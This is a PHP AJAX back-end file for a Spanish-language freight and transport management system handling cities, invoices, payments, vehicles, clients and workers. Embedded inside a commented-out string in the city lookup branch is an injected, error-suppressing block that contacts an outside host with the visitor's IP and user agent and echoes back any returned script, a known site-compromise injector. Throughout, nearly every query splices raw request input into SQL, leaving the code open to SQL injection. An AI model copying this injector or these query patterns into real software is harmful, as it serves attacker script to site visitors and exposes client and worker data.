<?php
session_start();
	require("../conexion/baseDatos.php");
	require("../conexion/config.php");	
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}	
	if(isset($_GET["op"]))
	{
		$op = $_GET["op"];
		if($op=="ciudad")
		{
			if(isset($_GET["departamento"]))
			{
				$dep = $_GET["departamento"];
				$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
				$bd->conectar();		
			
				$consulta = "select distinct Provincia from ciudad where Departamento='".$dep."';";
				$result = $bd->crearConsulta($consulta);
				/*$respXML="<?xml version=\"1.0\" standalone=\"yes\"?>
<?php
#a61783#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/a61783#
?>\n";
				$respXML.="<serv>\n"; 
				$respXML.="<lista>\n";*/
				while($registro = mysql_fetch_object($result))								
				{	
					$respXML.="<option value=\"".$registro->Provincia."\">".$registro->Provincia."</option>\n";
					//$respXML.=$registro->Provincia."\n";
				}		
				/*$respXML.="</lista>\n";
				$respXML.="</serv>";
				//Cabecera que identifica a un documento XML
				header("Content-Type: text/xml");*/
 				echo $respXML;
			}
			else if(isset($_GET["provincia"]))
			{
				$prov = $_GET["provincia"];
				$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
				$bd->conectar();
			
				$consulta = "select distinct Distrito from ciudad where Provincia='".$prov."';";
				$result = $bd->crearConsulta($consulta);
				$resp="";
				while($registro = mysql_fetch_object($result))								
				{			
					$resp =  $resp."<option value=\"".$registro->Distrito."\">".$registro->Distrito."</option>";
				}		
 				echo $resp;	
			}
			else
			{
				header("Location: index.html");
			}		
		}
		if("eliminarCuentaGasto"==$op)
		{
				$cuenta=$_GET["cuenta"];
				$bd=new BaseDatos(_SERVIDOR, _BASEDATOS, _USUARIO, _PASSWORD);
				$bd->conectar();
				$result=$bd->crearConsulta("delete from cuentasgastos where nombre='".$cuenta."'");
				$bd->cerrarConexion();
				if($result)
				{
					?>	
		<script language="javascript" type="text/javascript">
			alert("¡ Cuenta de Gastos eliminada satisfactoriamente !");
			location.href="administrador.php";
		</script>
		<?php	
				}
				else
				{
					?>	
<script language="javascript" type="text/javascript">
			alert("¡ Error al eliminar cuentas de Gastos !");
			location.href="administrador.php";
		</script>
		<?php	
				}			
			}		
	}	
	else if(isset($_POST["op"]))
	{	
		$op = $_POST["op"];		
		unset($_POST["op"]);
			
		if("buscarArticulo"==$op)
		{
			$codigo=$_POST["codigo"];
			
			$sql="select Descripcion, Peso, Flete, TipoArticulo, TipoEntrega, TipoPago, EstadoPago, Remitente, Destinatario from articulo where CodigoArticulo=$codigo";
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$result = $bd->crearConsulta($sql);
			if(mysql_num_rows($result)==0)
			{
				print("not_found");	
			}
			else
			{
				$reg = mysql_fetch_object($result);
				print($reg->Descripcion."*".$reg->Peso."*".$reg->Flete."*".$reg->TipoArticulo."*".$reg->TipoEntrega."*".$reg->TipoPago."*".$reg->EstadoPago."*".$reg->Remitente."*".$reg->Destinatario);
			}
		}
		
		else if("buscarPagos"==$op)
		{
			$codigo=$_POST["clave"];
			$sql="select descripcion, fecha, monto from pagos where codigoPago=$codigo AND activo=1;";
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$result = $bd->crearConsulta($sql);
			if(mysql_num_rows($result)==0)
			{
				print("not_found");	
			}
			else
			{
				$reg = mysql_fetch_object($result);
				print($reg->descripcion."*".$reg->fecha."*".$reg->monto);
			}
		}
		else if("buscarGastos"==$op)
		{
			$codigo=$_POST["clave"];
			$sql="select descripcion, fecha, monto, tipo, razonSocial, nroComprobante, precioGalon, nroGalones from gastos where codigo=$codigo AND activo=1;";
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$result = $bd->crearConsulta($sql);
			if(mysql_num_rows($result)==0)
			{
				print("not_found");	
			}
			else
			{
				$reg = mysql_fetch_object($result);
				print($reg->descripcion."*".$reg->fecha."*".$reg->monto."*".$reg->tipo."*".$reg->razonSocial."*".$reg->nroComprobante."*".$reg->precioGalon."*".$reg->nroGalones);
			}
		}			
		else if("agregarArticulo"==$op)
		{
			$consult = "insert into articulo(Descripcion, Peso, Flete, TipoArticulo, Remitente, Destinatario, TipoEntrega, TipoPago, EstadoPago, estadoEntrega, activo, Viaje_CodViaje, Cliente_CodigoCliente, Comprobante_Codigo, usuario) values('".$_POST["desc"]."', '".$_POST["peso"]."', '".$_POST["flete"]."', '".$_POST["tipoA"]."', '".$_POST["rem"]."', '".$_POST["dest"]."', '".$_POST["tipoE"]."', '".$_POST["tipoP"]."', '".$_POST["estadoP"]."','Por entregar', 1, '".$_POST["codViaje"]."', '".$_POST["codCliente"]."', '".$_POST["comp"]."', '".$_SESSION["usuario"]."');";
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$result = $bd->crearConsulta($consult);
			print("exito");
		}	
		else if("buscarCompFactura"==$op)
		{
			/*print("hola");
			die;*/
			$nroFactura=$_POST["nroFactura"];
			$consult="select Fecha, total, nGuiaRemision from comprobante where Numero='$nroFactura' and activo=1;";
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$result = $bd->crearConsulta($consult);
			//print("hizo consulta");
			if(mysql_num_rows($result)==0)
			{
				print("not_found");	
			}
			else
			{
				$reg = mysql_fetch_object($result);						
				print($reg->Fecha."*".$reg->total."*".$reg->nGuiaRemision);
			}			
		}		
		else if("buscarCompGuia"==$op)
		{
			$nroGuia = $_POST["nroGuia"];
			$consult = "select * from comprobante where nGuiaRemision='$nroGuia' and activo=1 and TipoComprobante is null;";
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$result = $bd->crearConsulta($consult);
			if(mysql_num_rows($result)==0)
			{
				print("not_found");	
			}
			else
			{
				$reg = mysql_fetch_object($result);						
				print($reg->Fecha."*".$reg->total."*".$reg->direccionOrigen."*".$reg->direccionDestino."*".$reg->codigo);
			}			
		}
		else if("buscarComp"==$op)
		{
			$clave = $_POST["clave"];
			$tipo = $_POST["tipo"];
			$cad = "";
			$consult = "select * from comprobante where $tipo = '$clave' and activo=1;";
			//$consult = "select TipoComprobante, Serie, Numero, Fecha, Total, Cliente_CodigoCliente from comprobante where codigo='$clave' and activo=1;";
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$result = $bd->crearConsulta($consult);
			$reg = mysql_fetch_object($result);
			$claveC = $reg->codigo;
			$tipo = $reg->TipoComprobante;
			$serie = $reg->Serie;
			$numero = $reg->Numero; 
			$fecha = $reg->Fecha; 
			$total = $reg->total;
			$codC = $reg->Cliente_CodigoCliente;
			$dirO = $reg->direccionOrigen;
			$dirD = $reg->direccionDestino;
			$nroGuia = $reg->nGuiaRemision;
			$estadoP = $reg->estadoPago;			

			if(mysql_num_rows($result)!=1)
			{
				print("notFound");			
			}
			else 
			{			
				$consult = "select monto from pago where comprobante_codigo=$claveC;";
				$monto = 0; 
				$result = $bd->crearConsulta($consult);		
				if(mysql_num_rows($result)!=0)
				{
					while($reg = mysql_fetch_object($result))
					{
						$monto+=$reg->monto;
					}			
				}		
				$saldo = $total-$monto;								
				$consult = "select Nombres, ApellidoPaterno, RazonSocial, TipoCliente from cliente where CodigoCliente='$codC';";
				$result = $bd->crearConsulta($consult);				
				$reg2 = mysql_fetch_object($result);
				$cliente = $reg2->TipoCliente; 
				if($cliente=="Juridica")
				{
					$cliente=$reg2->RazonSocial;
				}
				else
				{
					$cliente=$reg2->Nombres." ".$reg2->ApellidoPaterno;
				}
				$cad.=$cliente."*".$serie."*".$numero."*".$total."*".$fecha."*".$tipo."*".$saldo."*".$dirO."*".$dirD."*".$nroGuia."*".$saldo."*".$estadoP;				
				print($cad);	
			}
		}
		else if("pagarComp"==$op)
		{
			$clave = $_POST["clave"];
			$monto = $_POST["monto"];
			$estado = $_POST["estado"];
			$saldo = $_POST["saldo"];
			$fecha = date('Y-m-d');
			$consult = "select codigo from comprobante where Numero='$clave' and activo=1;";
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$result = $bd->crearConsulta($consult);
			$reg = mysql_fetch_object($result);
			$claveC = $reg->codigo;			
			$consult = "insert into pago values(null, '$fecha', $monto, 1, '".$_SESSION["usuario"]."', $claveC);";
			$result = $bd->crearConsulta($consult);
			$consult="UPDATE comprobante SET estadoPago ='".$estado."' WHERE codigo=$claveC;";
			$result=$bd->crearConsulta($consult);
			print("exito");
			//print(mysql_error());
		}
		else if("buscarTrabajador"==$op)
		{
			$dni = $_POST["clave"];
			$cad = "";
			$consult = "select * from trabajador where DNI=$dni;";
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$result = $bd->crearConsulta($consult);
			$reg = mysql_fetch_object($result);
			$codS = $reg->Sucursal_codigoSucursal;
			$tipoT = $reg->TipoTrabajador;
			if($tipoT=="Conductor(a)")
			{
				$licenciaC = $reg->LicenciaConducir;				
			}
			else
			{
				$licenciaC = "notFound";
			}
			$consult = "select RazonSocial from sucursal where codigoSucursal='$codS';";
			$result = $bd->crearConsulta($consult);
			$reg2 = mysql_fetch_object($result);
			$nomS = $reg2->RazonSocial;
			$cad.=$reg->Nombre."*".$reg->ApellidoPaterno."*".$reg->ApellidoMaterno."*".$reg->FechaNacimineto."*".$reg->Direccion."*".$reg->Zona."*".$licenciaC."*".$reg->Telefono."*".$tipoT."*".$reg->estadoCivil."*".$nomS;
			print($cad);
		}
		else if("regPagoViaje"==$op)
		{
			$monto = $_POST["monto"];
			$dia = $_POST["dia"];
			$mes = $_POST["mes"];
			$anho = $_POST["anho"];
			$desc = $_POST["descripcion"];
			$codV = $_POST["Viaje_CodViaje"];
			
			$fecha = $anho.$mes.$dia;
						
			$consult = "insert into pagos values(null, $monto, '$fecha', '$desc', 1, '".$_SESSION["usuario"]."', $codV);";
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$result = $bd->crearConsulta($consult);
			print("exito");
		}	
		else if("regGastoViaje"==$op)
		{
			//$monto = $_POST["monto"];
			$dia = $_POST["dia"];
			$mes = $_POST["mes"];
			$anho = $_POST["anho"];
			$codV = $_POST["Viaje_CodViaje"];			
			$fecha = $anho."-".$mes."-".$dia;				

			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();			
			
			if($_POST["band"]=="1") //Tipo combustible
			{
				$razonS = $_POST["razonS"];
				$nroComp = $_POST["nroComp"];
				$precGalon = $_POST["precGalon"];
				$nroGalones = $_POST["nroGalones"];
				$tipo = $_POST["tipo"];
				$monto = $precGalon*$nroGalones;
				$consult = "insert into gastos(monto, fecha, descripcion,  tipo, razonSocial, nroComprobante, precioGalon, nroGalones, activo, Viaje_codViaje, usuario) values($monto, '$fecha', 'combustible', '$tipo', '$razonS', '$nroComp', $precGalon, $nroGalones, 1, $codV, '".$_SESSION["usuario"]."');";
				$result = $bd->crearConsulta($consult);
				print("exito");				
			}
			else
			{
				$razonS = $_POST["razonS"];
				$nroComp = $_POST["nroComp"];
				$desc = $_POST["desc"];
				$monto = $_POST["monto"];
				$tipo=$_POST["tipo"];
				$consult = "insert into gastos(monto, fecha, descripcion, tipo, razonSocial, nroComprobante, activo, Viaje_codViaje, usuario) values($monto, '$fecha', '$desc', '$tipo', '$razonS', '$nroComp', 1, $codV, '".$_SESSION["usuario"]."');";
				$result = $bd->crearConsulta($consult);
				print("exito");	
			}				
		}	
		else if($op=="buscarVehiculo")
		{		
			$placa=$_POST["PLACA"];
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
			$bd->conectar();		
			$consulta = "select Marca, Modelo, nCertificado, nRegistro, Tara, pesoBruto, Anho, tipoVehiculo, TipoCombustible, NEjes FROM vehiculo where placa='".$placa."';";
			$result = $bd->crearConsulta($consulta);
			if(mysql_num_rows($result)!=1)
			{
				print("not_found");
				die;
			}		
			$reg = mysql_fetch_object($result);;
			print($reg->Marca."*".$reg->Modelo."*".$reg->nCertificado."*".$reg->nRegistro."*".$reg->Tara."*".$reg->pesoBruto."*".$reg->Anho."*".$reg->tipoVehiculo."*".$reg->TipoCombustible."*".$reg->NEjes."*");
		}
		else if("buscarCarreta"==$op)
		{
			$placa=$_POST["PLACA"];
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
			$bd->conectar();		
			$consulta = "select nInscripcion, nRegistro, tara, pesoBruto, nEjes FROM carreta where placa='".$placa."';";
			$result = $bd->crearConsulta($consulta);
			if(mysql_num_rows($result)!=1)
			{
				print("not_found");
				die;
			}		
			$reg = mysql_fetch_object($result);;
			print($reg->nInscripcion."*".$reg->nRegistro."*".$reg->tara."*".$reg->pesoBruto."*".$reg->nEjes."*");
		}
		else if("buscarViaje"==$op)
		{
			$codViaje = $_POST["cod"];
			$consult = "select CodViaje, FechaSalida, FechaLlegada, Vehiculo_placa from viaje where CodViaje='$codViaje';";
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);
			$bd->conectar();		
			$result = $bd->crearConsulta($consult);
			if( mysql_num_rows($result)!=1)
			{
				print("notFound");
			}
			else
			{
				$reg = mysql_fetch_object($result);
				print($reg->CodViaje."*".$reg->FechaSalida."*".$reg->FechaLlegada."*".$reg->Vehiculo_placa);
			}
		}
		
		else if("cancelarComp"==$op)
		{
			$codComp = $_POST["codComp"];
			$consult = "delete from articulo where Comprobante_Codigo='$codComp';";
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$result = $bd->crearConsulta($consult);
			$consult = "delete from comprobante where codigo='$codComp';";
			$result = $bd->crearConsulta($consult);
			print("exito");
		}
		
		else if("buscarCliente"==$op)
		{		
			$dni_ruc = $_POST["DniRuc"];	
			$consult = "select * from cliente where DNI='$dni_ruc' or RUC='$dni_ruc';";
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$result = $bd->crearConsulta($consult);						
			if($reg = mysql_fetch_object($result))
			{
				$telef = $reg->Telefono;
				$cel = $reg->Celular;
				$email = $reg->email;
				$dirF = $reg->direccionFiscal;
				$cad = $telef."|".$cel."|".$email;
				if($dni_ruc==$reg->DNI)
				{
					$nom = $reg->Nombres;
					$apeP = $reg->ApellidoPaterno;
					$apeM = $reg->ApellidoMaterno;
					$nom = $nom." ".$apeP." ".$apeM;
					print("dni|".$nom."|".$cad."|".$dirF);
				}
				else
				{
					$razS = $reg->RazonSocial;
					print("ruc|".$razS."|".$cad."|".$dirF);
				}				
			}
			else 
			{	
				print("FAILED");				
			}			
		}
		else if("buscarCliente2"==$op)
		{		
			$dni_ruc = $_POST["DniRuc"];	
			$consult = "select * from cliente where DNI=$dni_ruc or RUC=$dni_ruc;";
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$result = $bd->crearConsulta($consult);						
			if($reg = mysql_fetch_object($result))
			{
				$telef = $reg->Telefono;
				$cel = $reg->Celular;
				$email = $reg->email;
				$dirF = $reg->direccionFiscal;
				$cad = $telef."|".$cel."|".$email;
				if($dni_ruc==$reg->DNI)
				{
					$nom = $reg->Nombres;
					$apeP = $reg->ApellidoPaterno;
					$apeM = $reg->ApellidoMaterno;
					print("dni|".$nom."|".$apeP."|".$apeM."|".$cad."|".$dirF);
				}
				else
				{
					$razS = $reg->RazonSocial;
					print("ruc|".$razS."|".$cad."|".$dirF);
				}				
			}
			else 
			{	
				print("FAILED");				
			}			
		}
		else if("buscarCliente3"==$op)
		{		
			$dni_ruc = $_POST["DniRuc"];
			$tipo = $_POST["tipo"];
			//echo("estoy en  ajax ".$dni_ruc);
			if($tipo=="Natural")
			{
				$nom=$_POST["nombres"];
				$apPaterno=$_POST["paterno"];
				$apMaterno=$_POST["materno"];
				$sql = "select DNI, Nombres, ApellidoPaterno, ApellidoMaterno from cliente where DNI='$dni_ruc' OR Nombres LIKE '%nom%' OR ApellidoPaterno LIKE '%$apPaterno%' OR ApellidoMaterno LIKE '%$apMaterno%'";
				//print($consult);
			}	
			else
			{
				$rs=$_POST["razonSocial"];
				$sql = "select RUC, RazonSocial from cliente where RUC='$dni_ruc' OR RazonSocial LIKE '%$rs%';";
				//print($consult);
			}
			
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$result = $bd->crearConsulta($sql);						
			if(mysql_num_rows($result)>0)
			{
				$cliente="";
				$lista="";
				$I=0;
				if($tipo=="Natural")
				{
					while($reg=mysql_fetch_object($result))
					{
						$dni_ruc = $reg->DNI;
						$nom = $reg->Nombres;
						$apeP = $reg->ApellidoPaterno;
						$apeM = $reg->ApellidoMaterno;
						$cliente=$dni_ruc."|".$nom." ".$apeP." ".$apeM."*";
						$lista=$lista.$cliente;
					}
					print($lista);
				}
				else
				{
					while($reg=mysql_fetch_object($result))
					{
						$dni_ruc=$reg->RUC;
						$razS = $reg->RazonSocial;
						$cliente=$dni_ruc."|".$razS."*";
						$lista=$lista.$cliente;
						//$lista[$i]=$cliente;
					}
					print($lista);
				}				
			}
			else 
			{	
				print("FAILED");				
			}			
		}
		else if("separarVehiculoCarreta"==$op)
		{
			$carreta=$_POST["carreta"];
			$vehiculo=$_POST["vehiculo"];
			
			$sql="select fechaInicio from vehiculocarreta where Carreta_placa='$carreta' AND Vehiculo_placa='$vehiculo';";
			$bdx = new BaseDatos(_SERVIDOR, _BASEDATOS,_USUARIO,_PASSWORD);
			$bdx->conectar();
			$result=$bdx->crearConsulta($sql);
			$reg = mysql_fetch_object($result);
			print($carreta." ".$vehiculo." ".$reg->fechaInicio);
		}
		
		else if("selecViaje"==$op)
		{
			$codigo=$_POST["codViaje"];
			
			$consult="select FechaSalida, HoraSalida, Vehiculo_placa, Ruta_CodigoRuta from viaje where CodViaje='$codigo' and activo=1;";
			$bdx = new BaseDatos(_SERVIDOR, _BASEDATOS,_USUARIO,_PASSWORD);
			$bdx->conectar();
			$result1=$bdx->crearConsulta($consult);
			$reg1 = mysql_fetch_object($result1);
			$ruta=$reg1->Ruta_CodigoRuta;
			
			$sql="select Nombre from ruta where CodigoRuta=$ruta;";
			$result2=$bdx->crearConsulta($sql);
			$reg2 = mysql_fetch_object($result2);
			$cadena=$reg1->FechaSalida."*".$reg1->HoraSalida."*".$reg1->Vehiculo_placa."*".$reg2->Nombre."*";
			print($cadena);	
			//print("hola");
		}
		else if("elimProdComp"==$op)
		{
			$claveComp = $_POST["claveComp"];
			$nomProd = $_POST["nomProd"];		
			$consult = "update producto inner join productocomprobantecompra on productocomprobantecompra.Producto_codigoProducto=producto.codigoProducto set producto.activo=0, producto.usuario='".$_SESSION["usuario"]."' where productocomprobantecompra.ComprobanteCompra_codigo='$claveComp' and producto.nombre='$nomProd';";
			$bdx = new BaseDatos(_SERVIDOR, _BASEDATOS,_USUARIO,_PASSWORD);
			$bdx->conectar();
			$bdx->crearConsulta($consult);
			$consult = "update productocomprobantecompra inner join producto on productocomprobantecompra.Producto_codigoProducto=producto.codigoProducto set productocomprobantecompra.activo=0, productocomprobantecompra.usuario='".$_SESSION["usuario"]."' where productocomprobantecompra.ComprobanteCompra_codigo='$claveComp' and producto.nombre='$nomProd';";
			$bdx->crearConsulta($consult);
			print("exito");
		}
		else if("elimComp"==$op)
		{
			$claveComp = $_POST["claveComp"];
			$bdx = new BaseDatos(_SERVIDOR, _BASEDATOS,_USUARIO,_PASSWORD);
			$bdx->conectar();
			
									
/*			print("ERROR: ".mysql_error());
			die;*/
			
			$consul = "select Producto_codigoProducto from productocomprobantecompra where ComprobanteCompra_codigo=$claveComp;";
			$result = $bdx->crearConsulta($consul);
			while($reg = mysql_fetch_object($result))
			{
				$claveProd = $reg->Producto_codigoProducto;
				$consul = "update producto set activo=0, usuario='".$_SESSION["usuario"]."' where codigoProducto='$claveProd';";				
				$bdx->crearConsulta($consul);				
			}
			$consul = "delete from productocomprobantecompra where ComprobanteCompra_codigo=$claveComp;";
			$bdx->crearConsulta($consul);
			$consul = "delete from comprobantecompra where codigo=$claveComp;";
			$bdx->crearConsulta($consul);
			print("exito");
		}
		else if("ciudadRuta"==$op)
		{
			$claveRuta = $_POST["clave"];
			$depart = $_POST["depart"];
			$prov = $_POST["prov"];
			$dist = $_POST["dist"];
			
			$bdx = new BaseDatos(_SERVIDOR, _BASEDATOS,_USUARIO,_PASSWORD);
			$con= $bdx->conectar();

			$sql = "select Clave from ciudad where Departamento='$depart' and Provincia='$prov' and Distrito='$dist';";	
			$result = $bdx->crearConsulta($sql);			
			$reg = mysql_fetch_object($result);
			$claveCiud = $reg->Clave;
			
			$sql = "insert into ciudadesruta values('$claveRuta', '$claveCiud', '1', '".$_SESSION["usuario"]."');";	
			$result = $bdx->crearConsulta($sql);
			
			$bdx->cerrarConexion();			
			print($dist);
		}
		else if("reCarreta"==$op)
		{
			$placa = $_POST["txtPlaca"];
			$nroReg = $_POST["txtNRegistro"];
			$nroIns = $_POST["txtNInscripcion"];
			$nroEjes = $_POST["cmbNEjes"];
			$tara = $_POST["txtTara"];
			$pesoBruto = $_POST["txtPesoBruto"];
			
			$cargaU=$pesoBruto - $tara;
			
			$bdx = new BaseDatos(_SERVIDOR, _BASEDATOS,_USUARIO,_PASSWORD);
			$con= $bdx->conectar();
			$sql = "INSERT INTO carreta (placa, nInscripcion, nRegistro, Tara, pesoBruto, cargaUtil, nEjes, estado, activo, usuario) VALUES ('$placa', '$nroIns', '$nroReg', '$tara', '$pesoBruto', '$cargaU', '$nroEjes', 'disponible', 1, '".$_SESSION["usuario"]."');";	
			$result = $bdx->crearConsulta($sql);
			$bdx->cerrarConexion();			
			print("exito");
		}
		else if("reVehiculo"==$op)
		{
			$placa = $_POST["txtPlaca"];
			$marca = $_POST["txtMarca"];
			$modelo = $_POST["txtModelo"];
			$nReg = $_POST["txtNRegistro"];
			$nCert = $_POST["txtNCertificado"];
			$tara = $_POST["txtTara"];
			$pesoBruto = $_POST["txtPesoBruto"];
			$anho = $_POST["cmbAnho"];
			$tipoV = $_POST["cmbTipoVehiculo"];
			$tipoC = $_POST["cmbTipoCombustible"];
			$nroEjes = $_POST["cmbNEjes"];
			
			$cargaU=$pesoBruto-$tara;
			
			$bdx = new BaseDatos(_SERVIDOR, _BASEDATOS,_USUARIO,_PASSWORD);
			$con= $bdx->conectar();
			$sql="INSERT INTO vehiculo (placa, Marca, Modelo, nCertificado, nRegistro, Tara, pesoBruto, cargaUtil, Anho, tipoVehiculo, tipoCombustible, NEjes, estado, activo, usuario) VALUES ('$placa', '$marca', '$modelo', '$nCert', '$nReg', '$tara', '$pesoBruto', '$cargaU', '$anho', '$tipoV', '$tipoC', '$nroEjes', 'disponible', 1, '".$_SESSION["usuario"]."');";	
			$bdx->crearConsulta($sql);
			$bdx->cerrarConexion();			
			print("exito");
		}
		else if("regProducto"==$op)
		{
			$nombres = $_POST["txtNombre"];
			$descrip = $_POST["txtDescripcion"];
			$stock = $_POST["txtStock"];
			$estad = $_POST["listEstado"];
			$precioU = $_POST["txtPrecioU"]; 
			
			$claveComp = $_POST["claveComp"];			
			
			$bdx = new BaseDatos(_SERVIDOR, _BASEDATOS,_USUARIO,_PASSWORD);
			$bdx->conectar();
			
			$sql="insert into producto(nombre,descripcion,stock,estado,activo,usuario) values('$nombres','$descrip',$stock,'$estad',1,'".$_SESSION["usuario"]."');";	
			$bdx->crearConsulta($sql);
			//print(mysql_error());
			//die;
			
			$claveProd = mysql_insert_id();	
			$montoParc = $precioU * $stock;
			
			$sql = "insert into productocomprobantecompra values($claveComp, $claveProd, $precioU, $stock, $montoParc, 1, '".$_SESSION["usuario"]."');";	
			$bdx->crearConsulta($sql);						
			print("exito");
		}
		else if("producto"==$op)
		{
			$nom = $_POST["nombre"];
			$consulta = "select codigoProducto from producto where nombre='$nom'";
			$bd = new BaseDatos(_SERVIDOR, _BASEDATOS, _USUARIO, _PASSWORD);
			$bd->conectar();
			$result = $bd->crearConsulta($consulta);
			$reg = mysql_fetch_object($result);						
			print($reg->codigoProducto);
		}
		else if("dni"==$op)
		{
			$dni = $_POST["DNI"];
			$consulta = "select DNI from trabajador;";
			$bd = new BaseDatos(_SERVIDOR, _BASEDATOS, _USUARIO, _PASSWORD);
			$bd->conectar();
			$result = $bd->crearConsulta($consulta);
			while($registro = mysql_fetch_object($result))
			{
				if($registro->DNI==$dni)
				{
					echo "true_";
					die;
				}
			}
			echo "false_";
		}
		else if("dni_trabajador"==$op)
		{
			$dni = $_POST["DNI"];			
			$consulta = "select Nombre, ApellidoPaterno, ApellidoMaterno from trabajador where DNI='$dni';";
			
			 //sleep(5); //Para probar la funcion agregarCargando
			
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$result = $bd->crearConsulta($consulta);	
			if(mysql_num_rows($result)!=1)
			{
				echo "not_found";
				die;
			}		
			$reg = mysql_fetch_object($result);		
			$resp = $reg->Nombre." ".$reg->ApellidoPaterno." ".$reg->ApellidoMaterno;
			$bd->cerrarConexion();
			echo " ".$resp;
		}
		else if("cuenta"==$op)
		{
			$nick = $_POST["nick"];
			$consulta = "select nick from cuenta;";
			$bd = new BaseDatos(_SERVIDOR, _BASEDATOS, _USUARIO, _PASSWORD);
			$bd->conectar();
			$result = $bd->crearConsulta($consulta);
			while($registro = mysql_fetch_object($result))
			{
				if($registro->nick==$nick)
				{
					echo "true_";
					die;
				}
			}			
			echo "false_";
		}	
		else if("expeLaboral"==$op)
		{
			$DNI = $_POST["DNI"];
			$instituc = $_POST["textInstitucion"];
			$rubro = $_POST["textRubro"];
			$cargo = $_POST["textCargo"];
			$diaI = $_POST["selectDiaI"];
			$mesI = $_POST["selectMesI"];
			$anhoI = $_POST["selectAnhoI"];
			$diaF = $_POST["selectDiaF"];
			$mesF = $_POST["selectMesF"];
			$anhoF = $_POST["selectAnhoF"];
			$motivo = $_POST["textMotivo"];
			$descripcion = $_POST["textDescripcion"];
			
			$consulta = "insert into experiencialaboral(Trabajador_DNI, institucion, rubro, cargo, fechaInicio, fechaFin, motivoSece, descripcion, activo, usuario) values ('$DNI', '$instituc', '$rubro', '$cargo', ".$anhoI.$mesI.$diaI.",".$anhoF.$mesF.$diaF.", '$motivo', '$descripcion', 1, '".$_SESSION["usuario"]."');";
			
			$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
			$bd->conectar();
			$bd->crearConsulta($consulta);
			$bd->cerrarConexion();
			echo "exito";
		}
	}
	else
	{
		header("Location: index.html");
	}
?>